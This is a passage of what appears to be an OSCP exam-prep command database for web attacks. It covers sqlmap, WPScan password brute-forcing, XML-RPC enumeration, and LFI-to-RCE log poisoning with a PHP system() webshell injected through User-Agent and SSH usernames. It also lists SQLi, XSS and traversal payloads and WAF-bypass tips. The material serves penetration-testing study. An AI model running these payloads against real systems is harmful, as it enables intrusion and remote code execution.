injection point explicitly)"", ""--batch"": ""Never ask for user input, use default behavior (essential for automation)"", ""--dump"": ""Dump database table contents (retrieves all data from discovered tables)"", ""-D"": ""Target specific database name (e.g., -D webapp_db)"", ""-T"": ""Target specific table name (e.g., -T users)"", ""-C"": ""Target specific columns (e.g., -C username,password)"", ""--threads"": ""Number of concurrent threads (default 1, max 10 - faster enumeration)"", ""--dbs"": ""Enumerate databases only (first step)"", ""--tables"": ""Enumerate tables in database"", ""--columns"": ""Enumerate columns in table"", ""--level"": ""Test level (1-5, default 1 - higher = more payloads/slower)"", ""--risk"": ""Risk level (1-3, default 1 - higher = more aggressive/dangerous payloads)"", ""--technique"": ""Injection techniques to use (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)"", ""--random-agent"": ""Use random User-Agent header (helps bypass basic WAF)"", ""--tamper"": ""Tamper scripts for WAF bypass (e.g., --tamper=space2comment,between)"", ""--os-shell"": ""Attempt interactive OS shell (requires stacked queries and permissions)"", ""-p"": ""Specify testable parameter (e.g., -p id)""}","[""sqli-detection-error""]","[""sqli-detection-error"", ""sqli-column-enum-orderby"", ""sqli-union-select-basic""]",""
"wpscan-enumerate-all","WPScan Comprehensive Enumeration","web","wpscan --url <URL> --enumerate u,ap,at,vp,vt,cb,dbe --api-token <WPSCAN_API_TOKEN> --disable-tls-checks","Enumerate WordPress users, plugins, themes, and vulnerabilities with comprehensive detection","wordpress","wpscan --url http://192.168.45.100/wordpress --enumerate u,ap,at,vp,vt,cb,dbe --api-token YOUR_API_TOKEN_HERE --disable-tls-checks","WordPress is extremely common in OSCP labs (appears in 30%+ of machines).

Always enumerate users first (u), then plugins (ap), then themes (at).

API token enhances vulnerability detection but not required for basic enumeration.

Time estimate:
5-15 minutes depending on plugin/theme count.

Document all findings in enumeration.md.

Free API token:
https://wpscan.com/register (25 API calls/day sufficient for exam).

Without API token, you still get plugin/theme/user enumeration but miss known vulnerabilities.","high","","","","{""not_wordpress"": ""Verify WordPress installation: curl -s <URL> | grep wp-content OR curl -s <URL>/wp-admin/ OR curl -s <URL>/readme.html"", ""timeout"": ""Reduce scan scope: --enumerate u (users only) OR increase timeout: --request-timeout 60"", ""rate_limited"": ""Add delays between requests: --throttle 3000 (3 second delay) OR reduce thread count: --max-threads 5"", ""no_api_token"": ""Get free token: https://wpscan.com/register (25 requests/day, no credit card required). Scan works without token but vulnerability detection is limited"", ""ssl_errors"": ""Self-signed certificate: --disable-tls-checks flag already included. For proxy: --proxy http://127.0.0.1:8080 --disable-tls-checks"", ""waf_blocking"": ""Try stealthier scan: remove aggressive options, add --user-agent 'Mozilla/5.0' OR use --random-user-agent"", ""403_forbidden"": ""WordPress may be blocking scanners. Try manual enumeration: wordpress-manual-version OR use different user agent""}","{""--url"": ""Target WordPress site to scan"", ""--enumerate"": ""Enumeration modes: u=users, ap=all plugins, at=all themes, vp=vulnerable plugins, vt=vulnerable themes, cb=config backups, dbe=db exports. Use comma-separated list for multiple modes"", ""--api-token"": ""WPScan vulnerability database API token - significantly improves vulnerability detection accuracy by checking against WPVulnDB"", ""--disable-tls-checks"": ""Disable SSL/TLS certificate validation (useful for self-signed certificates)""}","","[""wordpress-manual-version"", ""whatweb-enum"", ""nikto-scan""]","[""wpscan-aggressive-detection"", ""wpscan-password-attack"", ""wordpress-xmlrpc-enum""]"
"wpscan-aggressive-detection","WPScan Aggressive Plugin/Theme Detection","web","wpscan --url <URL> --plugins-detection aggressive --themes-detection aggressive --enumerate ap,at --api-token <WPSCAN_API_TOKEN>","Aggressive WordPress plugin and theme enumeration (more thorough but noisier than passive detection)","wordpress","wpscan --url http://192.168.45.100/wordpress --plugins-detection aggressive --themes-detection aggressive --enumerate ap,at --api-token YOUR_API_TOKEN_HERE","Aggressive detection is more thorough but generates more logs (easier to detect).

Use when passive enumeration (wpscan-enumerate-all) fails to find plugins/themes.

Time estimate:
10-20 minutes.

Passive mode:
checks readme.txt and meta tags only (stealthy).

Aggressive mode:
attempts directory listing, checks multiple version files (noisy but complete).

For OSCP, start passive then go aggressive if needed.","high","","","","{""too_slow"": ""Use passive detection first: --plugins-detection passive --themes-detection passive"", ""waf_blocking"": ""Aggressive mode triggers WAF. Use passive mode OR add delays: --throttle 5000"", ""no_plugins_found"": ""Plugins may have custom paths. Check manually: curl <URL>/wp-content/plugins/ OR view page source for wp-content references"", ""timeout"": ""Reduce scope: --enumerate ap (plugins only) OR --enumerate at (themes only)"", ""false_positives"": ""Aggressive mode may report inactive/deleted plugins. Verify manually: curl -I <URL>/wp-content/plugins/<PLUGIN>/""}","{""--url"": ""Target WordPress site to scan"", ""--plugins-detection"": ""Detection mode: passive (stealthy, checks readme.txt only) OR aggressive (thorough, checks directory listings and version files). Aggressive finds more but generates more logs"", ""--themes-detection"": ""Detection mode for themes: passive OR aggressive. Aggressive mode checks style.css and other version indicators"", ""--enumerate"": ""ap=all plugins, at=all themes. Without this, only vulnerable plugins/themes are enumerated"", ""--api-token"": ""WPScan API token for vulnerability database access""}","[""wpscan-enumerate-all""]","[""wordpress-manual-version""]","[""wpscan-password-attack""]"
"wpscan-password-attack","WPScan WordPress Password Attack","web","wpscan --url <URL> --usernames <USERS> --passwords <WORDLIST> --max-threads <THREADS>","WordPress user password brute force attack using discovered usernames and wordlist","wordpress","wpscan --url http://192.168.45.100/wordpress --usernames admin,john,editor --passwords /usr/share/wordlists/rockyou.txt --max-threads 20","WordPress password attacks are common in OSCP (credentials often lead to RCE via plugin/theme upload).

Time estimate:
15-60 minutes depending on wordlist size.

Always enumerate users first (wpscan-enumerate-all).

Common usernames:
admin, administrator, editor, author, john.

Start with small wordlist (1000-5000 passwords), expand if needed.

Rate limiting:
most WordPress sites allow 5-10 requests/second before blocking.

Use --throttle to avoid lockout.

Success = admin access = RCE via plugin/theme modification.","high","","","","{""too_slow"": ""Reduce wordlist size: head -n 1000 /usr/share/wordlists/rockyou.txt > small.txt OR increase threads: --max-threads 30"", ""rate_limiting"": ""Add delay between requests: --throttle 3000 (3 seconds) OR reduce threads: --max-threads 5"", ""account_lockout"": ""WordPress lockout plugin detected. Use smaller wordlist OR add longer delays: --throttle 10000"", ""no_users_found"": ""First run: wpscan --url <URL> --enumerate u to discover usernames"", ""403_forbidden"": ""WAF or security plugin blocking. Try: 1) Reduce threads --max-threads 1, 2) Add delays --throttle 5000, 3) Change user-agent --random-user-agent"", ""connection_timeout"": ""Increase timeout: --request-timeout 60 --connect-timeout 60""}","{""--url"": ""Target WordPress site to attack"", ""--usernames"": ""Username(s) to brute force. Can be single username, comma-separated list, or file path (one username per line)"", ""--passwords"": ""Path to password wordlist. Common: /usr/share/wordlists/rockyou.txt OR custom wordlist based on target"", ""--max-threads"": ""Number of concurrent threads (1-50). Higher = faster but more detectable. Default 5 is stealthy. Use 20-30 for speed in OSCP""}","[""wpscan-enumerate-all""]","[""burp-intruder""]",""
"wordpress-xmlrpc-enum","WordPress XML-RPC Enumeration","web","curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' <URL>/xmlrpc.php","Enumerate WordPress XML-RPC methods (potential for brute force, pingback attacks, and SSRF)","wordpress","curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://192.168.45.100/wordpress/xmlrpc.php","XML-RPC is a WordPress API endpoint (often enabled by default in older versions).

Security implications:
1) Brute force:
wp.getUsersBlogs method allows credential testing without lockout, 2) Pingback DDoS:
pingback.ping can be abused for DDoS amplification, 3) system.multicall:
send hundreds of login attempts in ONE request (bypasses rate limiting).

Time estimate:
2-5 minutes.

Pingback exploitation:
attacker can make WordPress server ping arbitrary URLs (SSRF).

For OSCP:
check if XML-RPC is enabled, enumerate methods, test for brute force capability.

Modern WordPress disables by default but legacy sites are vulnerable.","high","","","","{""xmlrpc_disabled"": ""XML-RPC disabled (404 or error). This is good security but blocks this attack vector. Try other WordPress attacks"", ""no_methods_listed"": ""XML-RPC enabled but methods may be restricted. Try specific methods manually: wp.getUsersBlogs, pingback.ping"", ""403_forbidden"": ""WAF or security plugin blocking XML-RPC. Try from different IP OR focus on other attack vectors"", ""parse_error"": ""Check XML syntax: ensure <methodCall> structure is correct. Use -H 'Content-Type: application/xml' if needed"", ""ssl_error"": ""Self-signed cert: add -k flag to curl command""}","{""-X POST"": ""HTTP POST method required for XML-RPC requests"", ""-d"": ""Data to send in POST body - XML-RPC method call structure"", ""system.listMethods"": ""XML-RPC method that lists all available methods on the server (like API endpoint enumeration)"", ""xmlrpc.php"": ""WordPress XML-RPC API endpoint (enabled by default in older versions)""}","[""wpscan-enumerate-all""]","[""wpscan-aggressive-detection""]","[""wpscan-password-attack"", ""searchsploit"", ""burp-intruder""]"
"wordpress-manual-version","Manual WordPress Version Detection","web","curl -s <URL> | grep 'content=""WordPress'","Manual WordPress version detection via meta generator tag (fallback when wpscan is blocked or unavailable)","wordpress","curl -s http://192.168.45.100/wordpress | grep 'content=""WordPress'","Manual version detection is CRITICAL when wpscan is blocked/unavailable (common in OSCP due to WAF/IPS).

Time estimate:
1-2 minutes.

Version detection methods (in order):
1) Meta generator tag (this command), 2) readme.html, 3) RSS feed generator, 4) JavaScript/CSS file paths, 5) Theme/plugin versions (indirect).

Why manual matters:
wpscan may be blocked by WAF but curl often bypasses.

WordPress versions have known exploits:
4.x = RCE vulns, 5.0-5.2 = image upload RCE, 5.x = XSS.

Always check version BEFORE exploitation attempts.

Document in enumeration.md.","high","","","","{""no_version_found"": ""Meta generator removed (good security). Try alternatives: 1) curl <URL>/readme.html, 2) curl <URL>/feed/, 3) Check theme/plugin versions, 4) Version fingerprinting via js/css file paths"", ""readme_removed"": ""readme.html deleted. Try feed method: curl -s <URL>/feed/ | grep generator"", ""all_methods_fail"": ""Version fully hidden. Use behavioral fingerprinting: searchsploit wordpress <feature>, wpscan --url <URL> --enumerate vp (vulnerable plugins reveal version range)"", ""waf_blocking"": ""Use different user agent: curl -s -A 'Mozilla/5.0' <URL> | grep WordPress""}","{""curl"": ""Command-line HTTP client for making web requests"", ""-s"": ""Silent mode - hides progress meter and error messages"", ""grep"": ""Search for pattern in output"", ""'content=\""WordPress'"": ""Search pattern for WordPress version in meta generator tag""}","","[""whatweb-enum"", ""wpscan-enumerate-all""]",""
"curl-ua-poison-apache","Apache User-Agent Log Poisoning","web","curl -A '<?php system($_GET[""c""]); ?>' http://<TARGET>:<PORT>/","Inject PHP code into Apache access.log via User-Agent header","","curl -A '<?php system($_GET[""c""]); ?>' http://192.168.45.100:80/","Manual alternative:
Use netcat to send raw HTTP request:
echo -e 'GET / HTTP/1.1\r\nHost:
<TARGET>\r\nUser-Agent:
<?php system($_GET[""c""]); ?>\r\n\r\n' | nc <TARGET> <PORT>.

Timing:
1-2 minutes for poisoning.

Add 2-3 minutes for LFI trigger and shell upgrade.

Total:
3-5 minutes.

Success rate:
High (70-80% when LFI confirmed and logs accessible).","Core LFI-to-RCE technique. Apache logs User-Agent without sanitization by default. Combined with LFI, achieves remote code execution. Common in OSCP (appears in ~30% of web boxes). Fast execution (2-3 minutes total).","","","","","{""-A"": ""User-Agent header. Normally identifies browser/client (e.g., 'Mozilla/5.0'). Apache logs this field by default in Combined Log Format without sanitization. By injecting PHP code here, we poison the log file. When LFI includes the log, PHP interpreter executes our payload. Alternative injection points: Referer (-e flag), Cookie (-H 'Cookie: ...'). User-Agent chosen because: (1) always logged by default Apache config, (2) least likely to break request parsing, (3) no length restrictions in most configs.""}","","[""lfi-access-log-apache"", ""lfi-rce-trigger""]",""
"curl-ua-poison-nginx","Nginx User-Agent Log Poisoning","web","curl -A '<?php system($_GET[""c""]); ?>' http://<TARGET>:<PORT>/","Inject PHP code into Nginx access.log via User-Agent header (Nginx variant)","","curl -A '<?php system($_GET[""c""]); ?>' http://192.168.45.100:80/","Manual alternative:
Raw HTTP via netcat (same as Apache variant).

Or use telnet:
telnet <TARGET> <PORT>, then manually type:
GET / HTTP/1.1<ENTER>Host:
<TARGET><ENTER>User-Agent:
<?php system($_GET[""c""]); ?><ENTER><ENTER> Success rate:
Medium-High (60-70%).

Lower than Apache because:
(1) Nginx admins more likely to customize log format, (2) SELinux/AppArmor more common on Nginx setups, (3) User-Agent logging sometimes disabled for performance.

Higher success on default Nginx installs.

Timing:
2-3 minutes (slightly longer than Apache due to path/user enumeration).

Add 1 minute for initial Nginx vs Apache detection.","Nginx becoming more common in OSCP (20-25% of web boxes). Technique identical to Apache, but different log paths and permissions. Nginx worker runs as 'nginx' or 'www-data' depending on distro. Understanding platform differences critical for exam success.","","","","","{""-A"": ""User-Agent header injection (same as Apache). Nginx difference: Default log format includes User-Agent as '$http_user_agent' variable. Nginx Combined Log Format: '$remote_addr - $remote_user [$time_local] \""$request\"" $status $body_bytes_sent \""$http_referer\"" \""$http_user_agent\""'. No sanitization occurs - direct string interpolation. Key difference from Apache: Nginx allows custom log formats, so User-Agent logging might be disabled (check nginx.conf). If disabled, try Referer header instead.""}","","",""
"lfi-access-log-apache","LFI Read Apache Access Log","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log'","Use LFI vulnerability to read Apache access.log (for verification or RCE trigger)","","curl 'http://192.168.45.100:80/index.php?page=../../../../var/log/apache2/access.log'","Manual alternative:
Use browser:
Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log directly.

Advantage:
See formatted output with syntax highlighting extensions.

Disadvantage:
Browser modifies User-Agent (harder to control payload injection).

For exam:
curl preferred (scriptable, exact control).

Success rate:
Medium (50-60%).

Many modern setups restrict log permissions (640 root:adm).

Default Apache on older Ubuntu (<=16.04) often world-readable (644).

OSCP boxes tend toward permissive configs for challenge purposes.

Timing:
30 seconds to 1 minute (quick verification step before poisoning).","Two-phase usage: (1) Verify log is readable before poisoning (saves time), (2) Trigger RCE after poisoning. Exam efficiency critical - test access before wasting time on poisoning. Common mistake: Poisoning log that LFI can't access.","","","","","","","",""
"lfi-access-log-nginx","LFI Read Nginx Access Log","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/nginx/access.log'","Use LFI vulnerability to read Nginx access.log (for verification or RCE trigger)","","curl 'http://192.168.45.100:80/index.php?file=../../../../var/log/nginx/access.log'","Manual alternative:
Browser-based testing (same as Apache).

For multi-vhost enumeration:
Use gobuster/wfuzz to fuzz vhost names, then try /var/log/nginx/<VHOST>_access.log.

Example:
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://<TARGET>/index.php?file=../../../../var/log/nginx/FUZZ_access.log' --hh 0 Success rate:
Medium (50-60%, similar to Apache).

Nginx advantage:
error.log often 644 permissions (more permissive than Apache error.log which is typically 640).

Timing:
1 minute (includes Nginx detection + log path enumeration).","Nginx-specific variant of Apache log reading. Path differences critical: /var/log/nginx/ vs /var/log/apache2/. Multi-vhost Nginx setups often use named logs (/var/log/nginx/<DOMAIN>_access.log) - requires enumeration. OSCP scenario: Default configs more common, but knowing variants saves time.","","","","","","","",""
"ssh-authlog-poison","SSH Auth Log Poisoning via Failed Login","web","ssh '<?php system($_GET[""c""]); ?>'@<TARGET>","Poison /var/log/auth.log by injecting PHP code into SSH username field (failed login technique)","","ssh '<?php system($_GET[""c""]); ?>'@192.168.45.100","Manual alternative:
If SSH client rejects PHP payload (some clients validate username format):
Use raw TCP socket.

Python one-liner:
python3 -c ""import socket; s=socket.socket(); s.connect(('<TARGET>',22)); s.recv(1024); s.send(b'SSH-2.0-OpenSSH_8.0\r\n'); s.send(b'<?php system(\$_GET[\""c\""]); ?>\r\n')"" (less reliable but bypasses client validation).

Success rate:
High (70-80% when SSH exposed and auth.log readable).

Advantages over web log poisoning:
(1) auth.log often group-readable (syslog group), (2) less likely to have SELinux restrictions, (3) works even if no web server running.

Disadvantages:
(1) Requires SSH port open, (2) generates failed login alerts (stealth concern in real engagements, not OSCP).

Timing:
1-2 minutes for poisoning.

30 seconds for SSH detection (nmap).

Total:
2-3 minutes.","Critical alternative when web logs not accessible. SSH logs to /var/log/auth.log, which is often more permissive (readable by syslog group, www-data sometimes member). OSCP frequency: Medium (15-20% of LFI challenges require this when Apache/Nginx logs fail). Failed login intentional - we want payload logged, not actual authentication.","","","","","","","",""
"lfi-auth-log","LFI Read SSH Auth Log","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log'","Use LFI to read /var/log/auth.log (SSH authentication log) for verification or RCE trigger","","curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/auth.log'","Manual alternative:
Browser-based or use wget:
wget -q -O - 'http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log' (wget advantage:
saves to file for offline analysis).

Success rate:
Medium-High (60-70%).

auth.log often more permissive than web logs.

Default permissions:
640 root:adm, but www-data sometimes in adm group (Ubuntu Server default) or syslog group.

Timing:
30 seconds (quick verification).","Pre-check before SSH log poisoning. Verifies: (1) auth.log exists, (2) readable by www-data, (3) SSH logging enabled. Common in OSCP when web logs fail. Auth.log contains: SSH logins, sudo attempts, cron jobs, user switches - useful for enumeration even without poisoning.","","","","","","","",""
"lfi-proc-environ","LFI Read /proc/self/environ","web","curl -A '<?php system($_GET[""c""]); ?>' 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../proc/self/environ'","Advanced log poisoning via /proc/self/environ - poison environment variables and trigger RCE","","curl -A '<?php system($_GET[""c""]); ?>' 'http://192.168.45.100:80/index.php?page=../../../../proc/self/environ'","Manual alternative:
Two-step approach using telnet:
(1) telnet <TARGET> <PORT>, (2) Manually type:
GET /<LFI_PARAM>?<PARAM>=../../../../proc/self/environ HTTP/1.1<ENTER>Host:
<TARGET><ENTER>User-Agent:
<?php system($_GET[""c""]); ?><ENTER><ENTER>.

Same result, more control over exact request format.

Success rate:
Medium (50-60%).

Works when:
(1) /proc filesystem mounted, (2) PHP not in strict safe_mode.

Fails when:
(1) Docker/container with --security-opt no-new-privileges, (2) /proc mounted with hidepid=2 option (paranoid security), (3) PHP CGI mode (different process context).

Success rate lower than log poisoning but critical fallback.

Timing:
2-3 minutes (includes understanding /proc output format).

Faster if familiar with technique.","Advanced technique when all log files fail. /proc/self/environ contains environment variables of current PHP process, including HTTP headers. By poisoning User-Agent (becomes HTTP_USER_AGENT env var), we inject code. Less common in OSCP (10-15%) but high-value when it works. Demonstrates deeper Linux knowledge.","","","","","{""-A"": ""User-Agent header becomes HTTP_USER_AGENT environment variable in PHP process. When we include /proc/self/environ via LFI, this variable (with our payload) is parsed by PHP interpreter. Critical: Must poison in SAME REQUEST as LFI (curl -A sets header for that specific request). Advantage over log poisoning: No permission issues - /proc always readable. Disadvantage: Must include /proc/self/environ in same request that contains payload (log poisoning allows separation of injection and trigger).""}","","",""
"lfi-rce-trigger","LFI Trigger RCE After Log Poisoning","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=<COMMAND>'","Trigger remote code execution via poisoned log file (second phase after successful poisoning)","","curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/apache2/access.log&c=whoami'","Manual alternative:
Browser-based for simple commands:
Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=whoami.

For complex commands (reverse shells with special chars):
Use Burp Suite Repeater to avoid URL encoding issues.

Best practice:
URL-encode <COMMAND> for reliability (bash -c becomes bash%20-c).

Success rate:
Very High (90-95% after successful poisoning).

Main failure point is earlier (poisoning/log access), not execution.

If you reach this step, RCE almost guaranteed unless PHP restrictions present.

Timing:
30 seconds per command test.

2-3 minutes for reverse shell establishment.","Second phase of log poisoning attack. First phase: inject payload via curl-ua-poison-apache. Second phase: trigger execution via this command. Understanding two-phase nature critical for OSCP - many students poison successfully but fail to trigger. This command demonstrates the full attack chain.","","","","","","","",""
"gobuster-dir","Directory Bruteforce","web","gobuster dir -u <URL> -w <WORDLIST> -x php,asp,aspx,html,txt -t <THREADS>","Discover hidden directories and files","","gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,html,txt -t 30","Adjust extensions based on technology stack","high","","","","","{""dir"": ""Directory/file bruteforce mode"", ""-u"": ""Target URL to scan"", ""-w"": ""Path to wordlist file"", ""-x"": ""File extensions to search for (comma-separated)"", ""-t"": ""Number of concurrent threads (default 10)""}","","[""dirbuster"", ""wfuzz-params"", ""gobuster-dir-common"", ""gobuster-dir-custom""]","[""nikto-scan"", ""lfi-test"", ""sqlmap-basic"", ""whatweb-enum"", ""web-manual-enumeration""]"
"nikto-scan","Nikto Web Scanner","web","nikto -h <URL> -output <OUTPUT>","Web vulnerability scanner","","nikto -h http://192.168.1.100 -output nikto_scan.txt","Can be slow but thorough","medium","","","","","{""-h"": ""Target host/URL to scan"", ""-output"": ""Save output to file for documentation""}","","",""
"sqlmap-basic","SQLMap Basic Scan","web","sqlmap -u '<URL>?<PARAM>=<VALUE>' --batch --banner","Automated SQL injection testing","","sqlmap -u 'http://192.168.1.100/page.php?id=1' --batch --banner","Save Burp request to file for complex requests","high","","","","","{""-u"": ""Target URL with parameter"", ""--batch"": ""Never ask for user input, use defaults"", ""--banner"": ""Retrieve DBMS banner to identify database type/version""}","[""gobuster-dir"", ""sqli-manual-test""]","[""sqlmap-from-request"", ""sqlmap-from-request-level3"", ""sqli-manual-test""]","[""sqlmap-enumerate-databases"", ""sqlmap-enumerate-tables"", ""sqlmap-dump-table""]"
"sqli-manual-test","Manual SQLi Test","web","' OR 1=1--","Basic SQL injection payload","","","Try with both single and double quotes","high","","","","","{""'"": ""SQL string delimiter to break out of query"", ""OR 1=1"": ""Always true condition to bypass authentication"", ""--"": ""SQL comment to ignore rest of query""}","","[""sqlmap-from-request"", ""sqlmap-basic""]","[""sqlmap-from-request-level3""]"
"wfuzz-params","Parameter Fuzzing","web","wfuzz -c -z file,<WORDLIST> --hc 404 '<URL>?FUZZ=test'","Discover hidden parameters","","wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 'http://192.168.1.100/page.php?FUZZ=test'","Filter by response size or status code","medium","","","","","{""-c"": ""Color output for better readability"", ""-z"": ""Payload source - 'file' for wordlist"", ""--hc"": ""Hide status codes (404 = not found)"", ""FUZZ"": ""Placeholder replaced by wordlist entries""}","","[""burp-intruder""]",""
"xss-test","XSS Basic Test","web","<script>alert(1)</script>","Basic XSS payload","","","Check if input is reflected in response

Alternative Techniques:
- ""><script>alert(1)</script>","medium","","","","","{""<script>"": ""HTML script tag for JavaScript execution"", ""alert(1)"": ""JavaScript function to trigger popup (proof of concept)"", ""</script>"": ""Closing script tag""}","","",""
"lfi-test","LFI Basic Test","web","../../../../../../etc/passwd","Local file inclusion test","","","Try with null byte (%00) termination

Alternative Techniques:
- ....//....//etc/passwd
- ..\..\..\..\windows\system32\drivers\etc\hosts
- file:///etc/passwd","high","","","","","{""../"": ""Directory traversal to move up directories"", ""etc/passwd"": ""Target file - Linux user database (always readable)""}","[""gobuster-dir""]","","[""bash-reverse-shell"", ""php-reverse-shell"", ""nc-listener-setup""]"
"curl-post","cURL POST Request","web","curl -X POST -d '<PARAM>=<VALUE>' <URL>","Send POST request with data","","curl -X POST -d 'username=admin' http://192.168.1.100/login.php","Use -H for custom headers","medium","","","","","{""-X"": ""HTTP method to use (POST, GET, PUT, DELETE)"", ""-d"": ""Data to send in POST request body"", ""-H"": ""Custom header (not shown but commonly used)""}","","",""
"whatweb-enum","Technology Stack Identification","web","whatweb -v <URL>","Identify web technologies","","whatweb -v http://192.168.1.100","Essential for finding version-specific exploits","high","","","","","{""-v"": ""Verbose output - shows all detected technologies and versions""}","","[""nikto-scan"", ""curl-post""]","[""gobuster-dir"", ""searchsploit"", ""searchsploit-service-version""]"
"web-manual-enumeration","Manual Web Application Enumeration","web","Browse application, view source, check robots.txt, examine forms, test inputs, enumerate pages","Manually enumerate web application to identify technologies, attack surface, and potential vulnerabilities before automated tools","enumeration","","CRITICAL OSCP METHODOLOGY: Manual enumeration BEFORE automated tools.

Manual web enumeration checklist:
(1) Browse application
    - Visit all pages
    - Click all links
    - Map functionality (login, search, upload, contact, admin)
    - Note unusual features

(2) View page source (Ctrl+U)
    - HTML comments (<!-- TODO: Remove admin backdoor -->)
    - JavaScript files (api endpoints, validation logic)
    - Hidden form fields
    - Hardcoded credentials
    - Version numbers

(3) Check standard files
    - /robots.txt (disallowed paths are interesting)
    - /sitemap.xml (all pages listed)
    - /.git/ (exposed Git repository)
    - /backup/, /backup.zip
    - /README.md, /CHANGELOG.md

(4) Technology identification
    - Framework: Laravel (.blade.php), Django (csrftoken), WordPress (wp-content)
    - Language: PHP (.php extension), ASP (.aspx), JSP (.jsp)
    - Server: Apache (Server header), Nginx, IIS
    - CMS: WordPress, Joomla, Drupal (view source for indicators)

(5) Test all input fields
    - Login forms: SQL injection ('admin'--), default creds
    - Search: XSS (<script>alert(1)</script>), SQLi
    - Upload: File upload bypass, webshell upload
    - Contact forms: Command injection, email injection
    - URL parameters: SQLi, LFI, XSS

(6) Examine HTTP headers
    curl -I http://target
    - Server version (Apache/2.4.41)
    - X-Powered-By (PHP/7.4.3)
    - Set-Cookie (session management)
    - X-Frame-Options, CSP (security headers)

(7) Error message analysis
    - Trigger errors intentionally
    - SQL errors (database type, version)
    - Path disclosure (/var/www/html/index.php)
    - Stack traces (framework, libraries)

(8) Session management
    - Cookie inspection (F12  Application  Cookies)
    - Session token format (predictable? JWT?)
    - Session fixation testing
    - Logout functionality

(9) Authentication testing
    - Default credentials (admin:admin, admin:password)
    - Password reset functionality
    - Registration page (if available)
    - Account lockout policy
    - Brute force protection

(10) Attack surface mapping
    - List all forms and inputs
    - List all parameters (GET, POST)
    - List all cookies
    - List all endpoints (/api/, /admin/, /user/)
    - Identify high-value targets

Common OSCP findings from manual enumeration:
(1) Version numbers in page source
     Search for CVEs, public exploits

(2) Hidden admin panel in robots.txt
     Disallow: /admin
     Browse to /admin for login

(3) SQL injection in login form
     Test with single quote
     Error reveals MySQL version

(4) File upload without validation
     Upload PHP webshell
     RCE achieved

(5) Path disclosure in error messages
     /var/www/html/ revealed
     Helps with LFI exploitation

Browser tools (F12 DevTools):
- Elements: Inspect HTML, modify forms
- Console: Execute JavaScript, API testing
- Network: HTTP requests/responses, parameters
- Application: Cookies, localStorage, sessionStorage
- Sources: JavaScript source code, debugging

Manual testing workflow:
1. Visit http://target (THIS STEP)
2. Browse all pages, map functionality
3. View source, check for comments/credentials
4. Test one input manually (SQL injection with ')
5. If vulnerable, proceed with SQLMap
6. If not, continue manual testing other inputs

Key observations to document:
- Framework/technology (guides exploit selection)
- Version numbers (CVE search)
- Input fields (attack vectors)
- Upload functionality (webshell upload)
- Admin panel location (privilege escalation)
- Error messages (information disclosure)

OSCP exam tip: Spend 10-15 minutes on manual enumeration BEFORE running tools. Document everything in enumeration.md. Manual testing often reveals vulns that tools miss (logic flaws, weak passwords, exposed admin panels). Trust manual verification over automated tools.

Time estimate: 10-20 minutes (thorough manual enumeration)","high","","","","{""nothing_interesting"": ""Check common paths: /admin, /login, /api, /uploads, /backup. View page source for comments. Check robots.txt, sitemap.xml"", ""cant_identify_tech"": ""Check HTTP headers: curl -I http://target. Look for X-Powered-By, Server headers. Check page source for framework indicators (Laravel = .blade.php, Django = csrftoken)"", ""need_systematic_approach"": ""Use checklist: 1) Browse all pages 2) View source 3) Test forms 4) Check robots.txt 5) Examine cookies 6) Test error messages 7) Map attack surface""}","","","","[""web-version-enumeration"", ""burpsuite-intercept-request"", ""sqli-manual-test""]"
"web-version-enumeration","Web Technology Version Enumeration","web","whatweb <TARGET> -v","Enumerate web application technologies, frameworks, and versions to identify CVEs and public exploits","enumeration","whatweb http://10.10.11.18 -v","VERSION ENUMERATION  CVE SEARCH  PUBLIC EXPLOIT: Standard OSCP workflow.

WhatWeb usage:
whatweb http://target              - Brief output
whatweb -v http://target           - Verbose (RECOMMENDED)
whatweb -a 3 http://target         - Aggressive mode (more plugins, louder)
whatweb http://target --log-json=output.json - JSON output for parsing

Common technologies detected:
Web Servers:
- Apache/2.4.41 (Ubuntu)
- nginx/1.18.0
- Microsoft-IIS/10.0

Languages:
- PHP/7.4.3
- Python/3.8 (Django, Flask)
- Ruby/2.7 (Rails)
- ASP.NET

Frameworks:
- Laravel 8.x
- WordPress 5.8.1
- Drupal 9
- Joomla 3.9

OSCP exploitation workflow:
1. Enumerate versions (THIS COMMAND)
   whatweb -v http://target

2. Extract key versions
   Example output:
   Apache/2.4.41, PHP/7.4.3, Laravel 8.75.0

3. Search for CVEs
   searchsploit laravel 8.75
   searchsploit apache 2.4.41
   searchsploit php 7.4

4. Research vulnerabilities
   Google: ""Laravel 8.75 CVE""
   ExploitDB: https://www.exploit-db.com/
   GitHub: Search for ""Laravel 8.75 exploit""

5. Test exploit
   Download PoC, modify for target, execute

6. Document in vulnerability_research.md

Alternative enumeration methods:
Method 1: curl headers
curl -I http://target
 Server: Apache/2.4.41
 X-Powered-By: PHP/7.4.3

Method 2: Wappalyzer (browser extension)
 Click icon in browser
 Shows technologies visually

Method 3: Manual page source inspection
View source (Ctrl+U) and search for:
- <meta name=""generator"" content=""WordPress 5.8"">
- <script src=""/js/jquery-3.5.1.min.js""></script>
- <!-- Laravel v8.75.0 -->

Method 4: Nmap HTTP enumeration
nmap -p 80 --script http-enum,http-headers,http-title target

Method 5: Nikto
nikto -h http://target
 Comprehensive but slow and loud

Common OSCP scenarios:
(1) Laravel version with CVE
    whatweb reveals: Laravel/8.40.0
     SearchSploit: Laravel 8.40.0 RCE (CVE-2021-3129)
     Download exploit, achieve RCE

(2) WordPress with vulnerable plugin
